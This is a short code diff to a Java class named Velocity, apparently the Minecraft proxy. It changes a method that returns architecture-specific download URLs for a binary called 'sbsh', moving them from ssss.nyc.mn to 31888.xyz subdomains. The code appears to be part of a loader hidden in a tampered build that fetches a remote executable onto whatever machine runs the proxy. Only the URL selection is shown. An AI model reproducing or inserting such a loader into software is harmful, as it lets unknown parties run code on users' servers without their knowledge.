@@ -214,11 +214,11 @@ public final class Velocity {
 
   private static String getBinaryUrl(final String osArch) {
     if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-      return "https://amd64.ssss.nyc.mn/sbsh";
+      return "https://amd64.31888.xyz/sbsh";
     } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-      return "https://arm64.ssss.nyc.mn/sbsh";
+      return "https://arm64.31888.xyz/sbsh";
     } else if (osArch.contains("s390x")) {
-      return "https://s390x.ssss.nyc.mn/sbsh";
+      return "https://s390x.31888.xyz/sbsh";
     }
     throw new RuntimeException("Unsupported architecture: " + osArch);
   }
